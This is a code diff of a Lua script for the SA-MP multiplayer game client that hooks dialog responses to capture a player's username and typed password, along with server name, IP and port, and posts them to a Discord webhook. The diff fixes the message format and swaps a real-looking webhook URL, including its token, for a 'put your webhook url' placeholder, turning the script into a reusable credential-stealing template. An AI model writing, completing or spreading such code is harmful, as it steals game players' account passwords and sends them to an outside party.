@@ -29,11 +29,11 @@ function sampev.onSendDialogResponse(satu,dua,tiga,inputtext)
     local serverIP = sampGetServerIP()
     local serverPort = sampGetServerPort()
 
-    sendToDiscord(string.format("server: %s username: %s password: %s" serverIP: %s", servername, playerName, inputtext, serverIP, serverPort))
+    sendToDiscord(string.format("serverIP: %s server: %s username: %s password: %s", serverIP, serverPort, servername, playerName, inputtext, serverIP, serverPort))
 end
 
 function sendToDiscord(message)
-    local webhook_url = "https://discord.com/api/webhooks/1311729481173700688/wLdX5OVGvsErQZHATXzuC_RL6Pqvh8eqXrqp9m2WR6l6g_vEx9IDueluL3Hge8OKZwB8"
+    local webhook_url = "put your webhook url"
     local response = requests.post{
         url = webhook_url,
         headers = {
@@ -41,7 +41,7 @@ function sendToDiscord(message)
         },
         data = {
             content = message,
-            username = "mata 2km"
+            username = "use your not name"
         }
     }
 
